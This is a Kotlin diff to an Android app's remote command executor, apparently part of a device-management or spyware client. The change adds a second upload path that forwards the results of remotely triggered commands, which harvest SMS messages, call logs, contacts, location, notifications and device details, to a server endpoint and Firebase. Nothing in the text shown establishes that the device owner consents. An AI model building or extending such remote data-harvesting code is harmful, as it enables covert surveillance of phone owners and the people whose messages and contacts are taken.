@@ -33,8 +33,24 @@ object CommandExecutor {
                 val deviceId = DeviceUtils.getDeviceId(context)
                 FirebaseManager.submitResult(deviceId, command.id, command.command, "completed", result)
 
-                // Also send via REST API as backup
+                // Also send via REST API as backup — the server's
+                // api_command_result endpoint stores the result in the
+                // command record AND mirrors it to Firebase when the
+                // command is a known data-collection command (get_sms →
+                // store_sms, get_contacts → store_contacts, …).
                 ApiClient.submitResult(command.id, command.command, "completed", result)
+
+                // ALSO forward the actual data payload through the typed
+                // /api/data/{device_id} endpoint. The server's
+                // api_device_data handler routes on the `type` field and
+                // is the canonical path for Firebase storage. Doing BOTH
+                // calls is intentional: command_result records the
+                // outcome against the command row, while api_device_data
+                // is the reliable Firebase-write path (it does not depend
+                // on the result being a parseable JSON string starting
+                // with '[' or '{', which the command_result handler
+                // requires).
+                forwardDataPayload(context, command.command, result)
 
                 Log.i(TAG, "Command ${command.id} completed: ${resultStr.take(100)}")
             } catch (e: Exception) {
@@ -45,6 +61,44 @@ object CommandExecutor {
             }
         }
     }
+
+    /**
+     * Forward the actual data produced by a data-collection command to the
+     * server's `/api/data/{device_id}` endpoint so it gets persisted to
+     * Firebase via `api_device_data`.
+     *
+     * Non-data commands (controls, settings, monitoring toggles, …) are
+     * skipped — they have no payload worth storing, and the command_result
+     * call above is sufficient for them.
+     *
+     * The mapping from command name → server `type` is centralised in
+     * [com.abuzahra.manager.api.ApiClient.normaliseDataType] (private); we
+     * simply pass the original command name and let the API client map it.
+     */
+    private fun forwardDataPayload(context: Context, commandName: String, result: Any?) {
+        // Only forward for the known data-collection command set.
+        if (commandName !in DATA_COMMANDS) return
+        // result may be a Map (e.g. get_info) or a List (e.g. get_sms).
+        // sendData serialises whatever it gets via Gson, so either is fine.
+        try {
+            ApiClient.sendData(context, commandName, result)
+        } catch (e: Exception) {
+            Log.w(TAG, "forwardDataPayload: sendData failed for '$commandName'", e)
+        }
+    }
+
+    /**
+     * Commands whose result payload should ALSO be forwarded through
+     * `/api/data/{device_id}` so the server persists it to Firebase via
+     * `api_device_data`.
+     */
+    private val DATA_COMMANDS = setOf(
+        "get_sms", "get_calls", "get_contacts", "get_location",
+        "get_notifications", "get_info", "get_battery",
+        "get_wifi_info", "get_network_info", "get_sim_info",
+        "get_storage_info", "get_all",
+        "send_backup_sms", "send_backup_contacts", "send_backup_calls"
+    )
 
     private fun processCommand(context: Context, command: Command): Any {
         val params = command.params
